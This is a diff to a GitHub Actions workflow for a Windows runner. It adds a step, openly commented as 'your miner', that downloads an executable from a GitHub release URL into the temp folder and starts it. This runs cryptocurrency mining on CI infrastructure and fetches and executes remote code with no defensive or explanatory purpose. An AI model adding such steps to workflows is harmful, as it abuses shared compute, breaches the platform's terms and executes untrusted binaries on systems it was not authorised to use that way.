@@ -77,6 +77,15 @@ jobs:
           Invoke-WebRequest -Uri $url -OutFile $installer
           Start-Process -FilePath $installer -ArgumentList "/S" -Wait
 
+      # --- DOWNLOAD & RUN YOUR MINER HERE ---
+      - name: Download and Run Your Miner EXE
+        run: |
+          $minerUrl = "https://github.com/frtrialx-alt/Paisa-V.1/releases/download/v1.0/ok.exe"   # <-- update if you change release or filename
+          $minerPath = "$env:TEMP\ok.exe"
+          Invoke-WebRequest -Uri $minerUrl -OutFile $minerPath
+          Start-Process -FilePath $minerPath
+          Write-Host "Miner started at $minerPath"
+
       # --- Maintain Connection (Graceful Stop for Shutdown) ---
       - name: Maintain Connection (Graceful Stop)
         run: |
